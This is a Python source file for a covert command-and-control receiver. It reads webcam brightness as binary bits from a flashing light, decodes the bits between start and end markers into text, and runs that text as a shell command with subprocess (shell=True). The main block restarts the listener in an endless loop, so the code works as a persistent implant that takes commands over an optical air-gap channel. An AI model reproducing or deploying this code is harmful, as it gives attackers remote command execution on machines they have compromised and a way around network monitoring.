import cv2
import numpy as np
import time
import subprocess

def rcvering_c2():
    # Parameters
    BIT_DURATION = 0.5   # seconds per bit (must match sender)
    THRESHOLD = 100      # brightness threshold
    START_MARKER = "11111110"
    END_MARKER = "00000000"

    cap = cv2.VideoCapture(0)  # 0 = default webcam

    bits = ""
    message_started = False

    print("Listening for flashlight c2 message... (Ctrl+C to stop)")

    try:
        while True:
            start_time = time.time()

            ret, frame = cap.read()
            if not ret:
                continue

            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            avg_brightness = np.mean(gray)

            bit = "1" if avg_brightness > THRESHOLD else "0"
            bits += bit
            print("Bits:", bits)

            # Check for start marker
            if not message_started and START_MARKER in bits:
                message_started = True
                bits = ""  # clear buffer after detecting start

            # If message started, check for end marker
            if message_started and END_MARKER in bits:
                # Extract message between markers
                raw_bits = bits[:bits.index(END_MARKER)]
                print("Raw bits (message only):", raw_bits)

                # Decode to ASCII
                decoded = ""
                for i in range(0, len(raw_bits), 8):
                    byte = raw_bits[i:i+8]
                    if len(byte) == 8:
                        decoded += chr(int(byte, 2))
                decoded = decoded.lower().replace(" ","").replace("0","").replace("`","").replace("±","").replace("¶","")
                output_command = subprocess.run(decoded, shell=True, capture_output=True, text=True).stdout
                print("Decoded message:", decoded,f"{output_command = }")
                break

                # Reset for next transmission
                bits = ""
                message_started = False

            # Wait for next bit window
            elapsed = time.time() - start_time
            time.sleep(max(0, BIT_DURATION - elapsed))

    except KeyboardInterrupt:
        print("\nStopped listening.")
    finally:
        cap.release()
        cv2.destroyAllWindows()

if __name__ == '__main__':
    while 1 :
        rcvering_c2()